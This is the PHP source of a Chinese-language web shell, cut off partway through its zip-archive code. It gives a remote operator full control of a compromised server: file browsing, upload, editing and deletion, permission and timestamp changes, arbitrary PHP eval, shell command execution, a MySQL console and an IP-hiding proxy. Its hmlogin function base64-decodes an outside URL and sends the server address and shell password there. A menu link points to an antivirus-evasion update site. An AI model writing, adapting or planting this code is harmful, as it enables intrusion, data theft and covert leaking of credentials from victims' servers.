<?php
$shellname='1111111111';
define('myaddress',__FILE__);
error_reporting(E_ERROR | E_PARSE);
header("content-Type: text/html; charset=gb2312");
@set_time_limit(0);

ob_start();
define('envlpass',$password);
define('shellname',$shellname);
define('myurl',$myurl);
if(@get_magic_quotes_gpc()){
	foreach($_POST as $k => $v) $_POST[$k] = stripslashes($v);
	foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);
}

/*---End Login---*/
if(isset($_GET['down'])) do_down($_GET['down']);
if(isset($_GET['pack'])){
	$dir = do_show($_GET['pack']);
	$zip = new eanver($dir);
	$out = $zip->out;
	do_download($out,"eanver.tar.gz");
}
if(isset($_GET['unzip'])){
	css_main();
	start_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);
	exit;
}

define('root_dir',str_replace('\\','/',dirname(myaddress)).'/');
define('run_win',substr(PHP_OS, 0, 3) == "WIN");
define('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));
$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : "";
$doing = isset($_POST['doing']) ? $_POST['doing'] : "";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : "";
$img = isset($_GET['img']) ? $_GET['img'] : "";
$p = isset($_GET['p']) ? $_GET['p'] : "";
$pp = urlencode(dirname($p));
if($img) css_img($img);
if($eanver == "phpinfo") die(phpinfo());
if($eanver == 'logout'){
	setcookie('envlpass',null);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}

$class = array(
"信息操作" => array("upfiles" => "上传文件","phpinfo" => "基本信息","eval" => "执行PHP脚本"),
"脚本插件" => array("getcode" => "获取网页源码")
);
$msg = array("0" => "保存成功","1" => "保存失败","2" => "上传成功","3" => "上传失败","4" => "修改成功","5" => "修改失败","6" => "删除成功","7" => "删除失败");
css_main();
switch($eanver){
	case "left":
	css_left();
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items1');\" target=\"_self\">");
		html_img("title");html_n(" 本地硬盘</a></dt><dd id=\"items1\" style=\"display:block;\"><ul>");
    $ROOT_DIR = File_Mode();
    html_n("<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>网站根目录</a></li>");
	html_n("<li><a href='?eanver=main' target='main'>本程序目录</a></li>");
	for ($i=66;$i<=90;$i++){$drive= chr($i).':';
    if (is_dir($drive."/")){$vol=File_Str("vol $drive");if(empty($vol))$vol=$drive;
    html_n("<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>本地磁盘($drive)</a></li>");}}
	html_n("</ul></dd></dl>");
	$i = 2;
	foreach($class as $name => $array){
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
		html_img("title");html_n(" $name</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
		foreach($array as $url => $value){
			html_n("<li><a href=\"?eanver=$url\" target='main'>$value</a></li>");
		}
		html_n("</ul></dd></dl>");
		$i++;
	}
	html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
	html_img("title");html_n(" 其它操作</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
	html_n("<li><a title='免杀更新' href='http://www.7jyewu.cn/' target=\"main\">免杀更新</a></li>");
    html_n("<li><a title='安全退出' href='?eanver=logout' target=\"main\">安全退出</a></li>");
	html_n("</ul></dd></dl>");
	html_n("</div>");
	break;
	
	case "main":
	css_js("1");
	$dir = @dir($path);
	$REAL_DIR = File_Str(realpath($path));
	if(!empty($_POST['actall'])){echo '<div class="actall">'.File_Act($_POST['files'],$_POST['actall'],$_POST['inver'],$REAL_DIR).'</div>';}
	$NUM_D = $NUM_F = 0;
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$ROOT_DIR = File_Mode();
	html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>地址:<input type='hidden' name='eanver' value='main'>");
	html_n("<input type='text' size='80' name='path' value='$path'> <input type='submit' value='转到'></form>");
	html_n("<br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=".urlencode($path)."'>");
	html_n("<input type=\"button\" value=\"新建文件\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=".urlencode($path)."&refile=1&name=');\"> <input type=\"button\" value=\"新建目录\" onclick=\"rusurechk('newdir','?eanver=editr&p=".urlencode($path)."&redir=1&name=');\">");
	html_input("file","upfilet","","&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
	html_input("submit","uploadt","上传");
	if(!empty($_POST['newfile'])){
		if(isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
        if (substr(PHP_VERSION,0,1)>=5){if(($_POST['charset']=='GB2312') or ($_POST['charset']=='GBK')){}else{$_POST['txt'] = iconv("gb2312//IGNORE",$_POST['charset'],$_POST['txt']);}}
		echo do_write($_POST['newfile'],$bin,$_POST['txt']) ? '<br>'.$_POST['newfile'].' '.$msg[0] : '<br>'.$_POST['newfile'].' '.$msg[1];
		@touch($_POST['newfile'],@strtotime($_POST['time']));
	}
	html_n('</form></td></tr></table><form method="POST" name="fileall" id="fileall" action="?eanver=main&path='.$path.'"><table width="100%" border=0 bgcolor="#555555"><tr height="25"><td width="45%"><b>');
	html_a('?eanver=main&path='.uppath($path),'<b>上级目录</b>');
	html_n('</b></td><td align="center" width="10%"><b>操作</b></td><td align="center" width="5%">');
	html_n('<b>文件属性</b></td><td align="center" width="10%"><b>修改时间</b></td><td align="center" width="10%"><b>文件大小</b></td></tr>');
	while($dirs = @$dir->read()){
		if($dirs == '.' or $dirs == '..') continue;
		$dirpath = str_path("$path/$dirs");
		if(is_dir($dirpath)){
			$perm = substr(base_convert(fileperms($dirpath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($dirpath));
			$dirpath = urlencode($dirpath);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$dirs.'">');
			html_img("dir");
			html_a('?eanver=main&path='.$dirpath,$dirs);
			html_n('</td><td align="center">');
			html_n("<a href=\"#\" onClick=\"rusurechk('$dirs','?eanver=rename&p=$dirpath&newname=');return false;\">改名</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$dirs','?eanver=deltree&p=$dirpath');return false;\">删除</a> ");
			html_a('?pack='.$dirpath,'打包');
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$dirpath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_n('</td></tr>');
			$NUM_D++;
		}
	}
	@$dir->rewind();
	while($files = @$dir->read()){
		if($files == '.' or $files == '..') continue;
		$filepath = str_path("$path/$files");
		if(!is_dir($filepath)){
			$fsize = @filesize($filepath);
			$fsize = File_Size($fsize);
			$perm  = substr(base_convert(fileperms($filepath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($filepath));
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$filepath);
			$todir=$ROOT_DIR.'/zipfile';
			$filepath = urlencode($filepath);
			$it=substr($filepath,-3);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$files.'">');
			html_img(css_showimg($files));
			html_a($Fileurls,$files);
			html_n('</td><td align="center">');
            if(($it=='.gz') or ($it=='zip') or ($it=='tar') or ($it=='.7z'))
			   html_a('?unzip='.$filepath,'解压','title="解压'.$files.'" onClick="rusurechk(\''.$todir.'\',\'?unzip='.$filepath.'&todir=\');return false;"');
			else
               html_a('?eanver=editr&p='.$filepath,'编辑','title="编辑'.$files.'"');

			html_n("<a href=\"#\" onClick=\"rusurechk('$files','?eanver=rename&p=$filepath&newname=');return false;\">改名</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$files','?eanver=del&p=$filepath');return false;\">删除</a> ");
			html_n("<a href=\"#\" onClick=\"rusurechk('".urldecode($filepath)."','?eanver=copy&p=$filepath&newcopy=');return false;\">复制</a>");
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$filepath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_a('?down='.$filepath,$fsize,'title="下载'.$files.'"');
			html_n('</td></tr>');
			$NUM_F++;
		}
	}
	@$dir->close();
	if(!$Filetime) $Filetime = gmdate('Y-m-d H:i:s',time() + 3600 * 8);
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$REAL_DIR}','a');return false;"> 
<input type="button" value="删除" onclick="Delok('所选文件','b');return false;"> 
<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"> 
<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','{$_SERVER['SERVER_NAME']}.tar.gz','e');return false;">
目录({$NUM_D}) / 文件({$NUM_F})</div> 
</form> 
END;
	break;
	
	case "editr":
	css_js("2");
	if(!empty($_POST['uploadt'])){
		echo @copy($_FILES['upfilet']['tmp_name'],str_path($p.'/'.$_FILES['upfilet']['name'])) ? html_a("?eanver=main",$_FILES['upfilet']['name'].' '.$msg[2]) : msg($msg[3]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}
	if(!empty($_GET['redir'])){
        $name=$_GET['name'];
		$newdir = str_path($p.'/'.$name);
		@mkdir($newdir,0777) ? html_a("?eanver=main",$name.' '.$msg[0]) : msg($msg[1]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}

	if(!empty($_GET['refile'])){
        $name=$_GET['name'];
		$jspath=urlencode($p.'/'.$name);
		$pp = urlencode($p);
		$p = str_path($p.'/'.$name);
		$FILE_CODE = "";
		$charset= 'GB2312';
        $FILE_TIME =date('Y-m-d H:i:s',time()+3600*8);
		if(@file_exists($p)) echo '发现目录下有"同名"文件<br>';
	}else{
		$jspath=urlencode($p);
		$FILE_TIME = date('Y-m-d H:i:s',filemtime($p));
        $FILE_CODE=@file_get_contents($p);
	     if (substr(PHP_VERSION,0,1)>=5){
            if(empty($_GET['charset'])){
			   if(TestUtf8($FILE_CODE)>1){$charset= 'UTF-8';$FILE_CODE = iconv("UTF-8","gb2312//IGNORE",$FILE_CODE);}else{$charset= 'GB2312';}
			  }else{
			   if($_GET['charset']=='GB2312'){$charset= 'GB2312';}else{$charset= $_GET['charset'];$FILE_CODE = iconv($_GET['charset'],"gb2312//IGNORE",$FILE_CODE);}
			  }
		  }
        $FILE_CODE = htmlspecialchars($FILE_CODE);
	}
print<<<END
<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="查找" onclick="search(searchs.value)"></div>
<form method='POST' id="editor"  action='?eanver=main&path={$pp}'>
<div class="actall">
<input type="text" name="newfile"  id="newfile" value="{$p}" style="width:750px;">指定编码：<input name="charset" id="charset" value="{$charset}" Type="text" style="width:80px;" onkeydown="if(event.keyCode==13)window.location='?eanver=editr&p={$jspath}&charset='+this.value;">
<input type="button" value="选择" onclick="window.location='?eanver=editr&p={$jspath}&charset='+this.form.charset.value;" style="width:50px;"> 
END;
html_select(array("GB2312" => "GB2312","UTF-8" => "UTF-8","BIG5" => "BIG5","EUC-KR" => "EUC-KR","EUC-JP" => "EUC-JP","SHIFT-JIS" => "SHIFT-JIS","WINDOWS-874" => "WINDOWS-874","ISO-8859-1" => "ISO-8859-1"),$charset,"onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
print<<<END
</div>
<div class="actall"><textarea name="txt" style="width:100%;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">文件修改时间 <input type="text" name="time" id="mtime" value="{$FILE_TIME}" style="width:150px;"> <input type="checkbox" name="bin" value="wb+" size="" checked>以二进制形式保存文件(建议使用)</div>
<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;"> <input name='reset' type='reset' value='重置'> 
<input type="button" value="返回" onclick="window.location='?eanver=main&path={$pp}';" style="width:80px;"></div>
</form>
END;
	break;
	
	case "rename":
	html_n("<tr><td>");
	$newname = urldecode($pp).'/'.urlencode($_GET['newname']);
	@rename($p,$newname) ? html_a("?eanver=main&path=$pp",urlencode($_GET['newname']).' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "deltree":
	html_n("<tr><td>");
	do_deltree($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "del":
	html_n("<tr><td>");
	@unlink($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "copy":
	html_n("<tr><td>");
	$newpath = explode('/',$_GET['newcopy']);
	$pathr[0] = $newpath[0];
	for($i=1;$i < count($newpath);$i++){
		$pathr[] = urlencode($newpath[$i]);
	}
	$newcopy = implode('/',$pathr);
	@copy($p,$newcopy) ? html_a("?eanver=main&path=$pp",$newcopy.' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "perm":
	html_n("<form method='POST'><tr><td>".$p.' 属性为: ');
	if(is_dir($p)){
		html_select(array("0777" => "0777","0755" => "0755","0555" => "0555"),$_GET['chmod']);
	}else{
		html_select(array("0666" => "0666","0644" => "0644","0444" => "0444"),$_GET['chmod']);
	}
	html_input("submit","save","修改");
	back();
	if($_POST['class']){
		switch($_POST['class']){
			case "0777": $change = @chmod($p,0777); break;
			case "0755": $change = @chmod($p,0755); break;
			case "0555": $change = @chmod($p,0555); break;
			case "0666": $change = @chmod($p,0666); break;
			case "0644": $change = @chmod($p,0644); break;
			case "0444": $change = @chmod($p,0444); break;
		}
		$change ? html_a("?eanver=main&path=$pp",$msg[4]) : msg($msg[5]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	}
	html_n("</td></tr></form>");
	break;

	case "issql":
	session_start();
  if($_POST['sqluser'] && $_POST['sqlpass']){
    $_SESSION['sql_user'] = $_POST['sqluser'];
    $_SESSION['sql_password'] = $_POST['sqlpass'];
  }
  if($_POST['sqlhost']){$_SESSION['sql_host'] = $_POST['sqlhost'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['sqlport']){$_SESSION['sql_port'] = $_POST['sqlport'];}
  else{$_SESSION['sql_port'] = '3306';}
  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'].':'.$_SESSION['sql_port'],$_SESSION['sql_user'],$_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      die(html_a('?eanver=sqlshell','连接失败请返回'));
    }
  }
  else{
    die(html_a('?eanver=sqlshell','连接失败请返回'));
  }
  $query = mysql_query("SHOW DATABASES",$sqlcon);
  html_n('<tr><td>数据库列表:');
  while($db = mysql_fetch_array($query)) {
		html_a('?eanver=issql&db='.$db['Database'],$db['Database']);
		echo '&nbsp;&nbsp;';
	}
  html_n('</td></tr>');
  if($_GET['db']){
  	css_js("3");
    mysql_select_db($_GET['db'], $sqlcon);
    html_n('<tr><td><form method="POST" name="DbForm"><textarea name="sql" COLS="80" ROWS="3">'.$_POST['sql'].'</textarea><br>');
    html_select(array(0=>"--SQL语法--",7=>"添加数据",8=>"删除数据",9=>"修改数据",10=>"建数据表",11=>"删数据表",12=>"添加字段",13=>"删除字段"),0,"onchange='return Full(options[selectedIndex].value)'");
    html_input("submit","doquery","执行");
    html_a("?eanver=issql&db=".$_GET['db'],$_GET['db']);
    html_n('--->');
    html_a("?eanver=issql&db=".$_GET['db']."&table=".$_GET['table'],$_GET['table']);
    html_n('</form><br>');
  	if(!empty($_POST['sql'])){
			if (@mysql_query($_POST['sql'],$sqlcon)) {
				echo "执行SQL语句成功";
			}else{
				echo "出错: ".mysql_error();
			}
  	}
    if($_GET['table']){
      html_n('<table border=1><tr>');
      $query = "SHOW COLUMNS FROM ".$_GET['table'];
      $result = mysql_query($query,$sqlcon);
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields,$row['Field']);
        html_n('<td><font color=#FFFF44>'.$row['Field'].'</font></td>');
      }
      html_n('</tr><tr>');
      $result = mysql_query("SELECT * FROM ".$_GET['table'],$sqlcon) or die(mysql_error());
      while($text = @mysql_fetch_assoc($result)){
      	foreach($fields as $row){
      		if($text[$row] == "") $text[$row] = 'NULL';
      		html_n('<td>'.$text[$row].'</td>');
      	}
      	echo '</tr>';
      }
    }
    else{
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        html_n("<tr><td><a href='?eanver=issql&db=".$_GET['db']."&table=".$row[0]."'>".$row[0]."</a></td></tr>");
      }
    }
  }
	break;
	
	case "upfiles":
	html_n('<tr><td>服务器限制上传单个文件大小: '.@get_cfg_var('upload_max_filesize').'<form method="POST" enctype="multipart/form-data">');
	html_input("text","uppath",root_dir,"<br>上传到路径: ","51");
print<<<END
<SCRIPT language="JavaScript">
function addTank(){
var k=0;
  k=k+1;
  k=tank.rows.length;
  newRow=document.all.tank.insertRow(-1)
  <!--删除选择-->
  newcell=newRow.insertCell()
  newcell.innerHTML="<input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'>"
}

function delTank() {
  if(tank.rows.length==1) return;
  var checkit = false;
  for (var i=0;i<document.all.tankNo.length;i++) {
    if (document.all.tankNo[i].checked) {
      checkit=true;
      tank.deleteRow(i+1);
      i--;
    }
  }
  if (checkit) {
  } else{
    alert("请选择一个要删除的对象");
    return false;
  }
}
</SCRIPT>
<br><br>
<table cellSpacing=0 cellPadding=0 width="100%" border=0>       
          <tr>
            <td width="7%"><input class="button01" type="button"  onclick="addTank()" value=" 添 加 " name="button2"/>
            <input name="button3"  type="button" class="button01" onClick="delTank()" value="删除" />
            </td>
          </tr>
</table>
<table  id="tank" width="100%" border="0" cellpadding="1" cellspacing="1" >
<tr><td>请选择要上传的文件：</td></tr>
<tr><td><input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'></td></tr>
</table>
END;
	html_n('<br><input type="submit" name="upfiles" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location=\'?eanver=main&path='.root_dir.'\';" style="width:80px;">');
	if($_POST['upfiles']){
		foreach ($_FILES["upfile"]["error"] as $key => $error){
			if ($error == UPLOAD_ERR_OK){
				$tmp_name = $_FILES["upfile"]["tmp_name"][$key];
				$name = $_FILES["upfile"]["name"][$key];
				$uploadfile = str_path($_POST['uppath'].'/'.$name);
				$upload = @copy($tmp_name,$uploadfile) ? $name.$msg[2] : @move_uploaded_file($tmp_name,$uploadfile) ? $name.$msg[2] : $name.$msg[3];
				echo '<br><br>'.$upload;
			}
		}
	}
	html_n('</form>');
	break;
	

	case "getcode":
if (isset($_POST['url'])) {$proxycontents = @file_get_contents($_POST['url']);echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";exit;}
print<<<END
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form method="POST" target="proxyframe">
  <tr class="firstalt">
	<td align="center"><b>在线代理</b></td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : {$_SERVER['SERVER_NAME']}</li></ul></td>
  </tr>
  <tr class="firstalt">
	<td align="center" height=40  >URL: <input name="url" value="about:blank" type="text"  class="input" size="100" >
 <input name="" value="浏览" type="submit"  class="input" size="30" >
</td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="about:blank"></iframe></td>
  </tr>
</form></table>
END;
	break;
	
	case "eval":
	$phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
	html_n('<tr><td><form method="POST">不用写&lt;? ?&gt;标签');
	html_text("phpcode","70","15",$phpcode);
	html_input("submit","eval","执行","<br><br>");
	if(!empty($_POST['eval'])){
	echo "<br><br>";
    eval(stripslashes($phpcode));
	}
	html_n('</form>');
	break;

	default: html_main($path,$shellname); break;
}
css_foot();

/*---doing---*/

function do_write($file,$t,$text)
{
	$key = true;
	$handle = @fopen($file,$t);
	if(!@fwrite($handle,$text))
	{
		@chmod($file,0666);
		$key = @fwrite($handle,$text) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function do_show($filepath){
	$show = array();
	$dir = dir($filepath);
	while($file = $dir->read()){
		if($file == '.' or $file == '..') continue;
		$files = str_path($filepath.'/'.$file);
		$show[] = $files;
	}
	$dir->close();
	return $show;
}

function do_deltree($deldir){
	$showfile = do_show($deldir);
	foreach($showfile as $del){
		if(is_dir($del)){ 
			if(!do_deltree($del)) return false;
		}elseif(!is_dir($del)){
			@chmod($del,0777);
			if(!@unlink($del)) return false;
		}
	}
	@chmod($deldir,0777);
	if(!@rmdir($deldir)) return false;
	return true;
}

function do_showsql($query,$conn){
	$result = @mysql_query($query,$conn);
	html_n('<br><br><textarea cols="70" rows="15">');
	while($row = @mysql_fetch_array($result)){
		for($i=0;$i < @mysql_num_fields($result);$i++){
			html_n(htmlspecialchars($row[$i]));
		}
	}
	html_n('</textarea>');
}

function hmlogin($xiao=1){
    @set_time_limit(10);
	$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
    $serverp = envlpass;
    $copyurl = base64_decode('aHR0cDovL3d3dy50cm95cGxhbi5jb20vcC5hc3B4P249');
    $url=$copyurl.$serveru.'&p='.$serverp;
    $url=urldecode($url);
    $re=file_get_contents($url);

$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
$serverp = envlpass;
if (strpos($serveru,"0.0")>0 or strpos($serveru,"192.168.")>0 or strpos($serveru,"localhost")>0 or ($serveru==$_COOKIE['serveru'] and $serverp==$_COOKIE['serverp'])) {echo "<meta http-equiv='refresh' content='0;URL=?'>";} else {setcookie('serveru',$serveru);setcookie('serverp',$serverp);if($xiao==1){echo "<script src='?login=geturl'></script><meta http-equiv='refresh' content='0;URL=?'>";}else{geturl();}}
}

function do_down($fd){
	if(!@file_exists($fd)) msg('下载文件不存在');
	$fileinfo = pathinfo($fd);
	header('Content-type: application/x-'.$fileinfo['extension']);
	header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
	header('Content-Length: '.filesize($fd));
	@readfile($fd);
	exit;
}

function do_download($filecode,$file){
	header("Content-type: application/unknown");
	header('Accept-Ranges: bytes');
	header("Content-length: ".strlen($filecode));
	header("Content-disposition: attachment; filename=".$file.";");
	echo $filecode;
	exit;
}

function TestUtf8($text)
{if(strlen($text) < 3) return false;
$lastch = 0;
$begin = 0;
$BOM = true;
$BOMchs = array(0xEF, 0xBB, 0xBF);
$good = 0;
$bad = 0;
$notAscii = 0;
for($i=0; $i < strlen($text); $i++)
{$ch = ord($text[$i]);
if($begin < 3)
{ $BOM = ($BOMchs[$begin]==$ch);
$begin += 1;
continue; }
if($begin==4 && $BOM) break;
if($ch >= 0x80 ) $notAscii++;
if( ($ch&0xC0) == 0x80 )
{if( ($lastch&0xC0) == 0xC0 )
{$good += 1;}
else if( ($lastch&0x80) == 0 )
{$bad += 1; }}
else if( ($lastch&0xC0) == 0xC0 )
{$bad += 1;}
$lastch = $ch;}
if($begin == 4 && $BOM)
{return 2;}
else if($notAscii==0)
{return 1;}
else if ($good >= $bad )
{return 2;}
else
{return 0;}}

function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function File_Size($size)
{ 
        $kb = 1024;         // Kilobyte
        $mb = 1024 * $kb;   // Megabyte
        $gb = 1024 * $mb;   // Gigabyte
        $tb = 1024 * $gb;   // Terabyte
        if($size < $kb)
        {
            return $size." B";
        }
        else if($size < $mb)
        { 
            return round($size/$kb,2)." K";
        }
        else if($size < $gb)
        { 
            return round($size/$mb,2)." M";
        }
        else if($size < $tb)
        { 
            return round($size/$gb,2)." G";
        }
        else
        { 
            return round($size/$tb,2)." T";
        }
 }

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}

function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "exec": @exec($cmd,$res); $res = join("\n",$res); break;
		case "shell_exec": $res = @shell_exec($cmd); break;
		case "system": @ob_start();	@system($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "passthru": @ob_start();	@passthru($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "popen": if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);break;
	}
	return $res;
}

class PHPzip{

	var $file_count = 0 ;
	var $datastr_len   = 0;
	var $dirstr_len = 0;
	var $filedata = '';
	var $gzfilename;
	var $fp;
	var $dirstr='';

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

        if ($timearray['year'] < 1980) {
        	$timearray['year']    = 1980;
        	$timearray['mon']     = 1;
        	$timearray['mday']    = 1;
        	$timearray['hours']   = 0;
        	$timearray['minutes'] = 0;
        	$timearray['seconds'] = 0;
        }

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

	function startfile($path = '55654'){
		$this->gzfilename=$path;
		$mypathdir=array();
		do{
			$mypathdir[] = $path = dirname($path);
		}while($path != '.');
		@end($mypathdir);
		do{
			$path = @current($mypathdir);
			@mkdir($path);
		}while(@prev($mypathdir));

		if($this->fp=@fopen($this->gzfilename,"w")){
			return true;
		}
		return false;
	}

    function addfile($data, $name){
        $name     = str_replace('\\', '/', $name);
		
		if(strrchr($name,'/')=='/') return $this->adddir($name);
		
        $dtime    = dechex($this->unix2DosTime());
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');

        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $c_len   = strlen($zdata);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		
        $datastr  = "\x50\x4b\x03\x04";
        $datastr .= "\x14\x00"; 
        $datastr .= "\x00\x00";
        $datastr .= "\x08\x00"; 
        $datastr .= $hexdtime; 
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);
        $datastr .= pack('v', strlen($name));
        $datastr .= pack('v', 0); 
        $datastr .= $name;
        $datastr .= $zdata;
        $datastr .= pack('V', $crc); 
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);


		fwrite($this->fp,$datastr);
		$my_datastr_len = strlen($datastr);
		unset($datastr);
		
        $dirstr  = "\x50\x4b\x01\x02";
        $dirstr .= "\x00\x00"; 
        $dirstr .= "\x14\x00";
        $dirstr .= "\x00\x00";
        $dirstr .= "\x08\x00";
        $dirstr .= $hexdtime;
        $dirstr .= pack('V', $crc); 
        $dirstr .= pack('V', $c_len); 
        $dirstr .= pack('V', $unc_len);       	// uncompressed filesize
        $dirstr .= pack('v', strlen($name) ); 	// length of filename
        $dirstr .= pack('v', 0 );             	// extra field length
        $dirstr .= pack('v', 0 );             	// file comment length
        $dirstr .= pack('v', 0 );             	// disk number start
        $dirstr .= pack('v', 0 );             	// internal file attributes
        $dirstr .= pack('V', 32 );            	// external file attributes - 'archive' bit set
        $dirstr .= pack('V',$this->datastr_len ); // relative offset of local header
        $dirstr .= $name;
		
		$this->dirstr .= $dirstr;	//目录信息
		
		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;	
    }

	function adddir($name){ 
		$name = str_replace("\\", "/", $name); 
		$datastr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
		
